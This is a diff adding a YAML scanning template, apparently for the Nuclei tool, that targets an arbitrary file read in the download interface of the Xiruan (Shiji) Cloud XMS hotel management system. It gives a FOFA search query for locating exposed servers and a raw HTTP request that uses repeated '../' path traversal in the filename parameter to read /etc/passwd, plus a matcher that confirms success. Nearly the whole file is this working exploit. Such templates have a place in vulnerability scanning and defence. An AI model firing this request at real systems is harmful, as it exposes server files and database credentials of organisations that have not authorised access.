@@ -1,0 +1,24 @@
+id: xiruan-cloud-xms-download-file-read
+
+info:
+  name: 西软云XMS download接口任意文件读取漏洞
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="shiji-西软云XMS"
+        西软云XMS是基于云平台数据中心开发的支持多酒店、多语言、多平台的酒店管理系统。该系统download接口未正确校验文件访问权限，攻击者可通过构造特定路径参数实现对服务器任意文件的非授权读取，导致系统配置文件、数据库凭证等敏感数据泄露。
+  tags: 西软云XMS
+
+http:
+- raw:
+  - |
+    GET /FoxhisFileServer/action?method=download&filename=/..//..//..//..//..//..//..//..//..//..//..//../etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
